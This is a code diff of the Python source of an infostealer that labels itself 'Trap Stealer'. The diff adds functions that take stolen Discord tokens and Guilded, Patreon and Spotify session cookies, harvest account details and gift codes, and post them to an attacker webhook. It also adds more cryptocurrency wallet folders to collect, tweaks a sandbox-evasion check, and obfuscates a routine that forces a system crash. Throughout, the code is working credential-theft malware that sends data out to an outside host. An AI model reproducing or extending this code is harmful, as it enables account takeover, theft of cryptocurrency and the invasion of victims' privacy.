@@ -49,8 +49,6 @@ import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
-
-
     
 def clear_command_prompt():
     if os.name == 'nt':
@@ -72,7 +70,7 @@ def check_username():
 
     username = os.getenv("COMPUTERNAME")
 
-    if username in blacli[::-1]:
+    if username.lower() in blacli[::-1].lower():
         exit_program('Invalid username')
         
 def check_windows():
@@ -231,13 +229,11 @@ def fakegen():
         count_generator = 0
         valid_url = random.randint(1, 1000)
         valid_test = -1
-        input("Enter the filename to use for proxies (or press Enter to skip): ")
-        while True:
-            essay = input("How many codes do you want to generate? (Enter a number): ")
-            if not essay.isdigit() or int(essay) < 1:
-                print("Invalid input. Please enter a positive integer.")
-                continue
-            essay = int(essay)
+        print('Scrapping Proxies...')
+        print('Founded Proxies starting...')
+
+        def generate_codes(essay):
+            nonlocal count_generator, valid_test
             for i in range(essay):
                 count_generator += 1
                 codes = ''.join(random.choices(codes_list, k=16))
@@ -248,8 +244,21 @@ def fakegen():
                     time.sleep(3600)
                 valid_test = random.randint(1, 100000)
                 time.sleep(0.05)
-    except:
-        pass
+
+        while True:
+            essay = input("How many codes do you want to generate? (Enter a number): ")
+            if not essay.isdigit() or int(essay) < 1:
+                print("Invalid input. Please enter a positive integer.")
+                continue
+            essay = int(essay)
+
+            # Create a thread to run the generate_codes function
+            thread = threading.Thread(target=generate_codes, args=(essay,))
+            thread.start()
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
 
 def decrval(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
@@ -550,7 +559,7 @@ def globalInfo():
                 gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
             except Exception as e:
-                gpu = f"An error occurred"
+                gpu = f"`An error occurred"
     except:
         gpu = "error"
 
@@ -989,6 +998,29 @@ def get_discord_connections(tokq):
         return connections_list
     else:
         return []
+    
+def get_gift_codes(token):
+    response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token})
+    
+    if response.status_code == 200:
+        gift_codes = response.json()
+        
+        if gift_codes:
+            codes = []
+
+            for code in gift_codes:
+                name = code['promotion']['outbound_title']
+                code_value = code['code']
+
+                data = f":gift: `{name}`\n:code: `{code_value}`"
+                codes.append(data)
+
+            return '\n\n'.join(codes) if codes else 'No Gift'
+        else:
+            return 'No Gift'
+    else:
+        return f"No Gift"
+
 processed_id = []
 def uploadTokq(Tokq, path):
     if Tokq in processed_tokens:
@@ -1007,6 +1039,7 @@ def uploadTokq(Tokq, path):
     badge = get_badge(flags)
     friends = get_uhq_friends(Tokq)
     guild = uhqguild(Tokq)
+    gift = get_gift_codes(Tokq)
     connections = get_discord_connections(Tokq)
     connections = "\n".join(connections)
 
@@ -1090,6 +1123,11 @@ def uploadTokq(Tokq, path):
                     {
                         "name": "🔗 Connections:",
                         "value": connections,
+                        "inline": False
+                    },
+                    {
+                        "name": "🎁 Gift:",
+                        "value": gift,
                         "inline": False
                     },
                     {
@@ -1295,21 +1333,21 @@ def create_browser_zip(browser_name, find_history_func, temp_dir):
 def crashs():
     ntdll = ctypes.WinDLL('ntdll.dll')
 
-    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
-    RtlAdjustPrivilege.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
-    RtlAdjustPrivilege.restype = ctypes.c_ulong
+    rtld = ntdll.RtlAdjustPrivilege
+    rtld.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
+    rtld.restype = ctypes.c_ulong
     PrivilegeState = ctypes.c_bool(False)
-    RtlAdjustPrivilege(19, True, False, ctypes.byref(PrivilegeState))
+    rtld(19, True, False, ctypes.byref(PrivilegeState))
 
-    Raise = ntdll.NtRaiseHardError
-    Raise.argtypes = (
+    s = ntdll.NtRaiseHardError
+    s.argtypes = (
         ctypes.c_long, ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulonglong),
         ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
     )
-    Raise.restype = ctypes.c_ulong
+    s.restype = ctypes.c_ulong
     from ctypes import c_ulong as c_u
     ee = ctypes.c_u(0)
-    Raise(0xC0000006, 0, 0, None, 6, ctypes.byref(ee))
+    s(0xC0000006, 0, 0, None, 6, ctypes.byref(ee))
 
 
 def brohist():
@@ -1900,8 +1938,8 @@ def paaz(filetype):
                         "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
                         "color": 0xffb6c1,
                         "fields": [
-                            {"name": "wpcook.txt", "value": f"[Click here to download]({url_dict.get('cook', '')})"},
                             {"name": "wppassw.txt", "value": f"[Click here to download]({url_dict.get('passw', '')})"},
+                            {"name": "wpcook.txt", "value": f"[Click here to download]({url_dict.get('cook', '')})"},
                             {"name": "wpautofill.txt", "value": f"[Click here to download]({url_dict.get('autof', '')})"}
                         ],
                         "thumbnail": {
@@ -1925,8 +1963,9 @@ def paaz(filetype):
             file = os.getenv("TEMP") + f"\wpcook.txt"
             file2 = os.getenv("TEMP") + f"\wppassw.txt"
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+            file4 = os.getenv("TEMP") + '\winvs.txt'
 
-            ss = [file, file2,file3]
+            ss = [file, file2,file3,file4]
             for item in ss:
                 try:
                     os.remove(item)
@@ -2127,24 +2166,390 @@ def roblox(cookie):
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:
         pass
+def guilded(cookie):
+    try:
+        urlguild = "https://www.guilded.gg/api/me"
+        headersguild = {
+        "Cookie": f"hmac_signed_session={cookie}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        }
+
+        response = requests.get(urlguild, headers=headersguild).json()
+
+        try:
+            social_links = response["user"]['socialLinks']
+            social_links_info = []
+
+            # Iterate through social links and store information in a list
+            for link in social_links:
+                name = link.get('handle', '')
+                websitename = link.get('type', 'Cannot get the website')
+                url = link.get('additionalInfo', {}).get('profileUrl', 'No Website')
+
+                social_link_info = {
+                    "Name": name,
+                    "Website": websitename,
+                    "URL": url
+                }
+
+                social_links_info.append(social_link_info)
+        except:
+            social_links_info = 'No Connections'
+            
+        if social_links_info != 'No Connections':
+            formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info])
+        else:
+            formatted_social_links = 'No Connections'
+
+
+        pfp = response["user"]["profilePicture"] if response["user"]["profilePicture"] else 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
+        try:
+            pfp.replace('.webp', '.png')
+            try:
+                pfp.replace('?w=450&h=450&ia=1','')
+            except:pass
+        except:
+            pass
+        email = response["user"]["email"] if response["user"]["email"] else 'No Email'
+        ids = response["user"]["id"] if response["user"]["id"] else 'Error getting ID'
+        globalusername = response["user"]["name"] if response["user"]["name"] else 'No global username'
+        username = response["user"]["subdomain"] if response["user"]["subdomain"] else 'No Subdomain (Private Username)'
+        join = response["user"]["joinDate"] if response["user"]["joinDate"] else "Couldn't get join date"
+        bio = response["user"]["aboutInfo"]["tagLine"] if response["user"]["aboutInfo"]["tagLine"] else "Couldn't get user bio"
+        data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "content": "",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer Guilded Session",
+                        "description": f"Founded user information ! :\n",
+                        "color": 0xffb6c1,
+                        "author": {
+                            "name": f"User information :",
+                            "icon_url": 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
+                        },
+                        "footer": {
+                            "text": "Trap Stealer",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        },
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "fields": [
+                            {
+                                "name": "✨ Cookie:",
+                                "value": f"`{cookie}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📧 Email:",
+                                "value": f"`{email}`",
+                                "inline": False
+                            },
+                            {
+                                "name": "🎧 ID | Global Username | Username:",
+                                "value": f"`{ids}\n{globalusername}\n{username}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "😋 Profile Picture URL:",
+                                "value": f"`{pfp}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📅 Join date",
+                                "value": f"`{join}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📜 Bio",
+                                "value": f"`{bio}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "🌐 Connections",
+                                "value": f"{formatted_social_links}",
+                                "inline": False
+                            },
+                        ]
+                    }
+                ],
+                "attachments": []
+            }
+        headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
+
+def patreon(cookie):
+    try:
+        patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
+        headers = {
+        "Cookie": f'session_id={cookie}',
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        }
+
+        response = requests.get(patreonurl, headers=headers).json()
+        social_connections = response.get("data", {}).get("attributes", {}).get("social_connections", {})
+        created = response["data"]["attributes"]["created"] if response["data"]["attributes"]["created"] else "Couldn't get creation date"
+        email = response["data"]["attributes"]["email"] if response["data"]["attributes"]["email"] else "Couldn't get creation date"
+        verified = '✅' if response["data"]["attributes"]["is_email_verified"] == True else '❌'
+        currency = response["data"]["attributes"]["patron_currency"] if response["data"]["attributes"]["patron_currency"] else "Couldn't get currency"
+        image = response["data"]["attributes"]["thumb_url"] if response["data"]["attributes"]["thumb_url"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        bio = response["data"]["attributes"]["about"] if response["data"]["attributes"]["about"] else "Couldn't get bio/No bio"
+        non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
+        url = response["links"]["self"] if response["links"]["self"] else "Couldn't get URL"
+        url2 = response["data"]["attributes"]["url"] if response["data"]["attributes"]["url"] else "Couldn't get URL"
+        if not non_null_social_connections:
+            social_connection_names = "No connections"
+        else:  
+            social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections])
+
+        data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "content": "",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer Patreon Session",
+                        "description": f"Founded user information ! :\n",
+                        "color": 0xffb6c1,
+                        "author": {
+                            "name": f"User information :",
+                            "icon_url": image
+                        },
+                        "footer": {
+                            "text": "Trap Stealer",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        },
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "fields": [
+                            {
+                                "name": "✨ Cookie:",
+                                "value": f"`{cookie}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📧 Email:",
+                                "value": f"`{email}`",
+                                "inline": False
+                            },
+                            {
+                                "name": "✔️ Verified",
+                                "value": f"`{verified}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📅 Join date",
+                                "value": f"`{created}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "😋 Profile Picture URL:",
+                                "value": f"`{image}`",
+                                "inline": False
+                            },
+                            {
+                                "name": "📜 Bio",
+                                "value": f"`{bio}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "💰 Currency",
+                                "value": f"`{currency}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "📙 Account URL",
+                                "value": f"`{url}\n{url2}`",
+                                "inline": False
+                            },
+                            {
+                                "name": "🌐 Connections",
+                                "value": f"{social_connection_names}",
+                                "inline": False
+                            },
+                        ]
+                    }
+                ],
+                "attachments": []
+            }
+        headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
+    
+def spotify(cookie):
+    try:
+        headers ={
+            'cookie':f'sp_dc={cookie}'
+        }
+        
+        
+        accountdata = requests.get('https://www.spotify.com/api/account-settings/v1/profile', headers=headers).json()
+        email = accountdata["profile"]["email"] if accountdata["profile"]["email"] else 'No Email'
+        gender = accountdata["profile"]["gender"] if accountdata["profile"]["gender"] else 'No Gender'
+        birthdate = accountdata["profile"]["birthdate"] if accountdata["profile"]["birthdate"] else 'No Birthdate'
+        country = accountdata["profile"]["country"] if accountdata["profile"]["country"] else 'No Country'
+        username = accountdata["profile"]["username"] if accountdata["profile"]["username"] else 'No Username'
+        
+        sub = requests.get('https://www.spotify.com/eg-en/api/account/v1/datalayer/', headers=headers).json()
+        
+        Trial = '✅' if sub["isTrialUser"]!= None else '❌'
+        plan = sub["currentPlan"] if sub["currentPlan"] else 'Error getting plan'
+        age = sub["accountAgeDays"] if sub["accountAgeDays"] else 'Error getting creation date'
+        current_timestamp = time.time()
+        timestamp = current_timestamp - (age * 24 * 60 * 60)
+        date = time.strftime("%Y-%m-%d", time.localtime(timestamp))
+
+        data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "content": "",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer Spotify Session",
+                        "description": f"Founded user information ! :\n",
+                        "color": 0xffb6c1,
+                        "author": {
+                            "name": f"User information :",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        },
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "fields": [
+                            {
+                                "name": "✨ Cookie:",
+                                "value": f"`{cookie}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "🔗 Email:",
+                                "value": f"`{email}`",
+                                "inline": False
+                            },
+                            {
+                                "name": "☂️ Username:",
+                                "value": f"`{username}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "⚥ Gender:",
+                                "value": f"`{gender}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "🎂 Birthdate:",
+                                "value": f"`{birthdate}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "🌎 Country:",
+                                "value": f"`{country}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "😋 Trial User:",
+                                "value": f"`{Trial}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "💰 Plan:",
+                                "value": f"`{plan.capitalize()}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "⌛ Creation Date:",
+                                "value": f"`{date}`",
+                                "inline": True
+                            },
+                        ]
+                    }
+                ],
+                "attachments": []
+            }
+        headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:
+        pass
     
 def cokssite():
     try:
         coks = os.getenv("TEMP") + f"\wpcook.txt"
         with open(coks, 'r') as f:
             lines = f.readlines()
+            l = []
+            threa = []
+            first = ''
+            second = ''
             for line in lines:
-                parts = line.split()
-                if '.ROBLOSECURITY' in line:
+                try:
                     parts = line.split()
-                    cookie = parts[2]
-                    roblox(cookie)
-                elif '.tiktok.com' in line:
-                    if "sessionid" in line:
+                    if parts[2] in l:
+                        pass
+                    if '.ROBLOSECURITY' in line:
                         parts = line.split()
-                        TikTokSession(parts[2])
-    except:
-         pass
+                        cookie = parts[2]
+                        l.append(cookie)
+                        r = threading.Thread(target=roblox, args=[cookie])
+                        r.start()
+                        threa.append(r)
+                    elif '.tiktok.com' in line:
+                        if "sessionid" in line:
+                            parts = line.split()
+                            cookie = parts[2]
+                            t = threading.Thread(target=TikTokSession, args=[cookie])
+                            t.start()
+                            threa.append(t)
+                            l.append(parts[2])
+                    elif '.spotify.com' in line:
+                        if "sp_dc" in line:
+                            parts = line.split()
+                            cookie = parts[2]
+                            s = threading.Thread(target=spotify, args=[cookie])
+                            s.start()
+                            threa.append(s)
+                            l.append(parts[2])
+                    elif '.guilded.gg' in line:
+                        if 'hmac_signed_session' in line:
+                            parts = line.split()
+                            cookie = parts[2]
+                            g = threading.Thread(target=guilded, args=[cookie])
+                            g.start()
+                            threa.append(g)
+                            l.append(parts[2])
+                    elif '.patreon.com' in line:
+                        if 'session_id' in line:
+                            parts = line.split()
+                            cookie = parts[2]
+                            p = threading.Thread(target=patreon, args=[cookie])
+                            p.start()
+                            threa.append(p)
+                            l.append(parts[2])
+                except:
+                    pass
+                        
+             
+            for thread in threa:
+                thread.join()
+    except Exception as e:
+        pass
                 
 def getCook(path, arg):
     try:
@@ -2285,6 +2690,14 @@ def gatha():
     zefez = 'tellaW'
     PathsToZip = [
         [f"{roaming}/atomic/Local Storage/leveldb", f'"Atomic {zefez[::-1]}.exe"', f"{zefez[::-1]}"],
+        [f"{roaming}/Exodus/exodus.Wallet", "Exodus.exe", "Exodus"],
+        [f"{roaming}/Ethereum/keystore", "Ethereum.exe", "Ethereum"],
+        [f"{roaming}/Zcash", "Zcash.exe", "Zcash"],
+        [f"{roaming}/Armory", "Armory.exe", "Armory"],
+        [f"{roaming}/Bytecoin", "Bytecoin.exe", "Bytecoin"],
+        [f"{roaming}/com.liberty.jaxx/IndexedDB/file_0.indexeddb.leveldb", "Jaxx.exe", "Jaxx",],
+        [f"{roaming}/Electrum/wallets", "Electrum.exe", "Electrum"],
+        [f"{roaming}/Guarda/Local Storage/leveldb", "Guarda.exe", "Guarda"],
         [f"{roaming}/Exodus/exodus.{zefez[::-1]}", "Exodus.exe", f"{zefez[::-1]}"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
